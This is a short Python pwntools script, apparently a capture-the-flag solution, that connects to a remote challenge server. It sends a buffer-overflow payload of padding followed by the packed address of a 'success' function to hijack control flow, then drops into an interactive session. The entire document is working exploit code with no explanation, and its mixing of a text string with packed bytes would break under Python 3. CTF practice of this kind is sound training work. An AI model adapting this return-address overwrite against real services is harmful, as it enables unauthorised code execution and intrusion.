from pwn import *
context.log_level  ="debug"
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28153)
elf = ELF("./pwn")
shell = elf.sym['success']
payload  = 'a'*(0x11+4) + p32(shell)
payload = payload.ljust(0x104,'a')
io.sendline(payload)
io.recv()
io.interactive()
